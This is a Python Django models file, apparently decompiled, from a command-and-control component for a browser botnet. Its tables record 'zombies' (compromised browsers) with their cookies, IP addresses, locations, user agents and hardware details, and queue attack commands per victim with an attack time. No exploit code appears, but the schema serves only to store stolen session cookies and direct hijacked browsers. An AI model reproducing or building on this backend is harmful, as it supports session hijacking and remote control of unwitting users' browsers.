# Embedded file name: C:\lab\w2g\ui\..\ui\cc\models.py
"""cc model
"""
from django.db import models

class Zombies(models.Model):
    """\xe7\x9c\x9f\xe8\xba\xab - \xe6\xb0\xb4\xe5\x8d\xb0\xe6\x9c\xba\xe5\x88\xb6"""
    uid = models.CharField(unique=True, max_length=32)
    utmwg = models.CharField(unique=True, max_length=32)
    group = models.CharField(max_length=100)
    os = models.CharField(max_length=30)
    browser = models.CharField(max_length=30)
    title = models.CharField(max_length=1000)
    user_agent = models.CharField(max_length=1000)
    referer = models.CharField(max_length=1000)
    location = models.CharField(max_length=1000)
    ip = models.CharField(max_length=15)
    cookie = models.CharField(max_length=5000)
    born_time = models.DateTimeField()
    up_time = models.DateTimeField()
    status = models.IntegerField(default=0)
    desc = models.CharField(max_length=500)

    #增加字段
    local_time = models.CharField(max_length=50)
    screen = models.CharField(max_length=50)
    cpu_cores = models.CharField(max_length=10)
    memory = models.CharField(max_length=10)


    class Meta:
        db_table = u'zombies'


class ZombiesShadow(models.Model):
    """\xe5\xbd\xb1\xe5\xad\x90\xe5\x8f\xaf\xe4\xbb\xa5\xe6\x9c\x89\xe5\xa4\x9a\xe4\xb8\xaa:)"""
    uid = models.CharField(max_length=32, db_index=True)
    sid = models.CharField(max_length=32, db_index=True)
    group = models.CharField(max_length=100)
    browser = models.CharField(max_length=30)
    user_agent = models.CharField(max_length=1000)
    ip = models.CharField(max_length=15)
    cookie = models.CharField(max_length=5000)
    born_time = models.DateTimeField()
    up_time = models.DateTimeField()

    class Meta:
        db_table = u'zombies_shadow'


class ZombiesCmd(models.Model):
    uid = models.CharField(max_length=32, db_index=True)
    group = models.CharField(max_length=30)
    cmd = models.TextField(blank=True)
    attack_time = models.DateTimeField()
    add_time = models.DateTimeField()
    status = models.IntegerField(default=0)

    class Meta:
        db_table = u'zombies_cmd'


class ZombiesDetail(models.Model):
    uid = models.CharField(max_length=32, db_index=True)
    group = models.CharField(max_length=30)
    info = models.TextField(blank=True)
    type = models.CharField(max_length=30)
    time = models.DateTimeField(db_index=True)

    class Meta:
        db_table = u'zombies_detail'